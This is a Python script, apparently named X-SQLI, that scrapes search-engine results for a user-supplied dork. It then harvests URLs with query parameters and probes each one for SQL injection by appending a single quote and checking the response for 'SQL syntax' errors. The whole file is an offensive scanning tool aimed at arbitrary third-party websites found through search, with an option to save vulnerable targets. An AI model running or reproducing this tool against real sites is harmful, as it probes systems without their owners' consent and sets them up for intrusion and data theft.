#!/usr/bin/python3
import sys, requests, os
from SearchEngine import Google
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import Fore

now = datetime.now()
current = now.strftime('%M:%S')

error = f'{Fore.RED}[{current}]{Fore.WHITE}'
sus = f'{Fore.GREEN}[{current}]{Fore.WHITE}'
log = f'{Fore.YELLOW}[{current}]{Fore.WHITE}'
ukerror = f'{Fore.BLUE}[{current}]{Fore.WHITE}'

def clear():
    os.system('clear')

def Google(search):
    URL = ('https://google.com/search?q=' + search)
    headers = {'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'}
    request = requests.get(URL, headers=headers)
    if request.status_code == 200:
        soup = BeautifulSoup(request.content, 'html.parser')
        results = []
        for i in soup.find_all('div', {'class' : 'yuRUbf'}):
            link = i.find_all('a')
            links = link[0]['href']
            results.append(links)
    print(f'{sus} Connection made to Google')
    try:
        return(results)
    except Exception as e:
        print(f'{error} Error getting results from Google')
        pass

def Duckduckgo(search):
    URL = ('https://duckduckgo.com/html/?q=' + search)
    headers = {'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'}
    request = requests.get(URL, headers=headers)
    if request.status_code == 200:
        soup = BeautifulSoup(request.content, 'html.parser')
        results = []
        for i in soup.find_all('a', attrs={'class':'result__a'}):
            links = i['href']
            results.append(links)
    print(f'{sus} Connection made to DuckDuckGo')
    try:
        return(results)
    except Exception as e:
        print(f'{error} Error getting results from DuckDuckGo')
        pass


def Bing(search):
    URL = ('https://www.bing.com/search?q='+search)
    headers = {'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'}
    request = requests.get(URL, headers=headers)

    if request.status_code == 200:
        soup = BeautifulSoup(request.content, "html.parser")
        results = []
    
        for i in soup.find_all('li', {'class' : 'b_algo'}):
            link = i.find_all('a')
            links = link[0]['href']
            results.append(links)
    print(f'{sus} Connection made to Bing')
    try:
        return(results)
    except Exception as e:
        print(f'{error} Error getting results from Bing')
        pass

def Yahoo(search):
    URL = ('https://search.yahoo.com/search?q=' + search)
    headers = {'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'}
    request = requests.get(URL, headers=headers)

    if request.status_code == 200:
        soup = BeautifulSoup(request.content, 'html.parser')
        results = []
    
        for i in soup.find_all(attrs={"class": "ac-algo fz-l ac-21th lh-24"}):
            results.append(i.get('href'))
    print(f'{sus} Connection made to Yahoo')
    try:
        return(results)
    except Exception as e:
        print(f'{error} Error getting results from Yahoo')
        pass

def checkargs():
    if len(sys.argv) < 2:
        print(f'{log} Usage : python3 {sys.argv[0]} <DORK>')
        exit()
    else:
        pass

def inject(targets):
    clear()
    vuln = []

    print(f'{log} Trying to inject {len(targets)} sites')
    print()

    for target in targets:
        url = f'{target}=1\''
        req = requests.get(url).text

        if 'SQL syntax' in req:
            print(f'{sus} Injection Found {target}=1')
            vuln.append(f'{url}')
        else:
            print(f'{error} No Injection {target}=1')

    print()
    print(f'{log} {len(targets)} Sites tested')
    print(f'{sus} {len(vuln)} are vulnerable')

def main():
    checkargs()

    dork = sys.argv[1]

    google = Google(dork)
    duckduckgo = Duckduckgo(dork)
    bing = Bing(dork)
    yahoo = Yahoo(dork)

    targets = []
    injectionTargets = []
    targetCount = 0

    try:
        for link in google:
            print(f'{sus} Grabbed : {link}')
            targets.append(link)
    except:
        print(f'{error} No Links From Google')

    try:
        for link in duckduckgo:
            print(f'{sus} Grabbed : {link}')
            targets.append(link)
    except:
        print(f'{error} No Links From DuckDuckGo')

    try:
        for link in bing:
            print(f'{sus} Grabbed : {link}')
            targets.append(link)
    except:
        print(f'{error} No Links From Bing')

    try:
        for link in yahoo:
            print(f'{sus} Grabbed : {link}')
            targets.append(link)
    except:
        print(f'{error} No Links From Yahoo')

    for target in targets:
        target = target.split('=')
        try:
            url = target[0]
            param = target[1]
            targetCount += 1
            injectionTargets.append(url)
        except:
            pass

    print()
    print(f'{sus} {len(targets)} Targets Scraped')
    print(f'{sus} {targetCount} Targets With Posible Injections')

    continueIn = input('Would you like to try to inject these sites? (y/n)\n > ')

    if continueIn.lower() == 'y':
        inject(injectionTargets)
    else:
        continueIn = input('Would you like to save your hits (y/n)\n > ')

        if continueIn.lower() == 'y':
            f = open('targets.txt', 'a')
            f.write('========================X-INJECT========================\n\n')
            for target in injectionTargets:
                f.write(f'{target}\n')
                
            print(f'{sus} Saved posible targets to targets.txt')
            print(f'{log} Thank you for using X-SQLI')

        else:
            print(f'{log} Thank you for using X-SQLI')

main()
